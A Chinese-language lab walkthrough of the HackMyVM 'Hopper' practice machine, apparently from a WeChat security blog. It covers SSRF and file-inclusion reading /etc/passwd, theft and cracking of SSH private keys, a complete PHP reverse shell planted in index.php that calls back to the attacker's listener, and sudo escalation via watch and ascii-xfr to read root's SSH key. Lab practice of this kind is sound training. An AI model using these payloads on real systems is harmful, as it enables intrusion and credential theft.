@@ -1,0 +1,468 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/37J_1q3zKNYMgNeeFYTURA)
+
+ ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 59篇原创内容   公众号
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtPOj0YYrp1zqE57qEpNJnUHZgbNkiaQjufXAG2TTU5YcKtAbUhASIJMf2a7WIIJ8SQIahQN0KzicSw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  
+
+靶机信息
+----
+
+下载地址:
+
+```
+https://hackmyvm.eu/machines/machine.php?vm=Hopper  
+网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
+```
+
+靶场: HackMyVm.eu
+
+靶机名称: Hopper
+
+难度: 简单
+
+发布时间: 2021年7月30日
+
+提示信息:
+
+```
+无
+```
+
+目标: user.txt和root.txt
+
+  
+
+实验环境
+----
+
+```
+攻击机:VMware kali 10.0.0.3  
+  
+靶机:Vbox linux IP自动获取
+```
+
+  
+
+信息收集
+----
+
+### 扫描主机
+
+扫描局域网内的靶机IP地址
+
+```
+sudo nmap -sP 10.0.0.3/24
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到主机地址为10.0.0.105
+
+### 扫描端口
+
+扫描靶机开放的服务端口
+
+```
+sudo nmap -sC -sV -p- 10.0.0.105 -oN nmap.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到22和80端口开放，访问下80端口
+
+```
+http://10.0.0.105
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+首页只有一张图片，做个目录扫描
+
+```
+gobuster dir -u http://10.0.0.105 -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现/advanced-search目录，访问看看
+
+```
+http://10.0.0.105/advanced-search/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提示可以加载任何我想要的页面，随便提交点什么
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+看返回的链接应该就是文件包含，试试伪协议
+
+```
+http://10.0.0.105/advanced-search/path.php?path=file:///etc/passwd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+果然可以读取，看看内容有两个用户可以登录 ，把用户名保存下来。对advanced-search做目录扫描未发现有可利用的路径
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+继续挖掘advanced-search
+
+```
+view-source:http://10.0.0.105/advanced-search/path.php?path=127.0.0.1:22
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+存在服务器端请求伪造(SSRF)漏洞，扫描下内部端口
+
+```
+gobuster fuzz -u http://10.0.0.105/advanced-search/path.php?path=127.0.0.1:FUZZ -w ../../Dict/SecLists-2022.1/Fuzzing/5-digits-00000-99999.txt |grep -v 'Length=0'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现内部存在2222端口，访问下是什么
+
+```
+http://10.0.0.105/advanced-search/path.php?path=127.0.0.1:2222
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+是个web应该，做个目录扫描
+
+```
+gobuster fuzz -u http://10.0.0.105/advanced-search/path.php?path=127.0.0.1:2222/FUZZ -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt |grep -v 'Length=181'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现一个backup，访问看看
+
+```
+http://10.0.0.105/advanced-search/path.php?path=127.0.0.1:2222/backup
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+是个证书，把他保存为id_rsa，并尝试登录SSH
+
+```
+vi id_rsa  
+chmod 600 id_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+```
+ssh henry@10.0.0.105 -i id_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+id_rsa文件还有密码，拿来暴破一下
+
+```
+RSAcrack -k id_rsa -w /usr/share/wordlists/rockyou.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到密码，去登录碰一下账号
+
+```
+ssh edward@10.0.0.105 -i id_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录成功，先找flag
+
+```
+ls  
+cat user.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到user.txt，找找提权信息
+
+```
+ls -al /var/www/html/advanced-search
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现这里的文件都是root权限，修改index.php插入反弹shell试试能不能反弹回root权限
+
+1。攻击机监听4444端口
+
+```
+nc -lvvp 4444
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。靶机个性index.php插入反弹shell
+
+```
+<?php  
+set_time_limit (0);  
+$VERSION = "1.0";  
+$ip = '10.0.0.3';  // CHANGE THIS  
+$port = 4444;       // CHANGE THIS  
+$chunk_size = 1400;  
+$write_a = null;  
+$error_a = null;  
+$shell = 'uname -a; w; id; /bin/bash -i';  
+$daemon = 0;  
+$debug = 0;  
+  
+//  
+// Daemonise ourself if possible to avoid zombies later  
+//  
+  
+// pcntl_fork is hardly ever available, but will allow us to daemonise  
+// our php process and avoid zombies.  Worth a try...  
+if (function_exists('pcntl_fork')) {  
+	// Fork and have the parent process exit  
+	$pid = pcntl_fork();  
+	  
+	if ($pid == -1) {  
+		printit("ERROR: Can't fork");  
+		exit(1);  
+	}  
+	  
+	if ($pid) {  
+		exit(0);  // Parent exits  
+	}  
+  
+	// Make the current process a session leader  
+	// Will only succeed if we forked  
+	if (posix_setsid() == -1) {  
+		printit("Error: Can't setsid()");  
+		exit(1);  
+	}  
+  
+	$daemon = 1;  
+} else {  
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");  
+}  
+  
+// Change to a safe directory  
+chdir("/");  
+  
+// Remove any umask we inherited  
+umask(0);  
+  
+//  
+// Do the reverse shell...  
+//  
+  
+// Open reverse connection  
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);  
+if (!$sock) {  
+	printit("$errstr ($errno)");  
+	exit(1);  
+}  
+  
+// Spawn shell process  
+$descriptorspec = array(  
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from  
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to  
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to  
+);  
+  
+$process = proc_open($shell, $descriptorspec, $pipes);  
+  
+if (!is_resource($process)) {  
+	printit("ERROR: Can't spawn shell");  
+	exit(1);  
+}  
+  
+// Set everything to non-blocking  
+// Reason: Occsionally reads will block, even though stream_select tells us they won't  
+stream_set_blocking($pipes[0], 0);  
+stream_set_blocking($pipes[1], 0);  
+stream_set_blocking($pipes[2], 0);  
+stream_set_blocking($sock, 0);  
+  
+printit("Successfully opened reverse shell to $ip:$port");  
+  
+while (1) {  
+	// Check for end of TCP connection  
+	if (feof($sock)) {  
+		printit("ERROR: Shell connection terminated");  
+		break;  
+	}  
+  
+	// Check for end of STDOUT  
+	if (feof($pipes[1])) {  
+		printit("ERROR: Shell process terminated");  
+		break;  
+	}  
+  
+	// Wait until a command is end down $sock, or some  
+	// command output is available on STDOUT or STDERR  
+	$read_a = array($sock, $pipes[1], $pipes[2]);  
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);  
+  
+	// If we can read from the TCP socket, send  
+	// data to process's STDIN  
+	if (in_array($sock, $read_a)) {  
+		if ($debug) printit("SOCK READ");  
+		$input = fread($sock, $chunk_size);  
+		if ($debug) printit("SOCK: $input");  
+		fwrite($pipes[0], $input);  
+	}  
+  
+	// If we can read from the process's STDOUT  
+	// send data down tcp connection  
+	if (in_array($pipes[1], $read_a)) {  
+		if ($debug) printit("STDOUT READ");  
+		$input = fread($pipes[1], $chunk_size);  
+		if ($debug) printit("STDOUT: $input");  
+		fwrite($sock, $input);  
+	}  
+  
+	// If we can read from the process's STDERR  
+	// send data down tcp connection  
+	if (in_array($pipes[2], $read_a)) {  
+		if ($debug) printit("STDERR READ");  
+		$input = fread($pipes[2], $chunk_size);  
+		if ($debug) printit("STDERR: $input");  
+		fwrite($sock, $input);  
+	}  
+}  
+  
+fclose($sock);  
+fclose($pipes[0]);  
+fclose($pipes[1]);  
+fclose($pipes[2]);  
+proc_close($process);  
+  
+// Like print, but does nothing if we've daemonised ourself  
+// (I can't figure out how to redirect STDOUT like a proper daemon)  
+function printit ($string) {  
+	if (!$daemon) {  
+		print "$string\n";  
+	}  
+}  
+  
+?>
+```
+
+3。访问index.php
+
+```
+http://10.0.0.105/advanced-search/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+反弹成功，但是没有获取到root权限，用www-data权限找找提权信息
+
+```
+sudo -l
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现watch命令以henry权限访问不需要密码，先看看watch是什么
+
+```
+sudo -u henry /usr/bin/watch
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+好像可以执行程序，找一下如何提权
+
+```
+https://gtfobins.github.io/gtfobins/watch/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+知道如何提权了，执行payload(需要先切换到交互式shell)
+
+```
+sudo -u henry /usr/bin/watch -x sh -c 'reset; exec sh 1>&0 2>&0'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提权成功，切换下交互式shell，然后找找提权信息
+
+```
+sudo -l
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+找到以root身份执行ascii-xfr命令不需要密码，再来看看这个命令如何提权
+
+```
+https://gtfobins.github.io/gtfobins/ascii-xfr/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+可以读取文件，猜一下root帐号下有没有id_rsa文件
+
+```
+sudo ascii-xfr -ns /root/.ssh/id_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到key，保存好登录ssh
+
+```
+vi root_rsa  
+chmod 600 root_rsa  
+ssh root@10.0.0.105 -i root_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+需要密码，再暴破一次
+
+```
+RSAcrack -k root_rsa -w /usr/share/wordlists/rockyou.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到key的密码，可以登录ssh了
+
+```
+ssh root@10.0.0.105 -i root_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录成功，拿到root.txt，游戏结束
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+END
+
+  
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+  
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
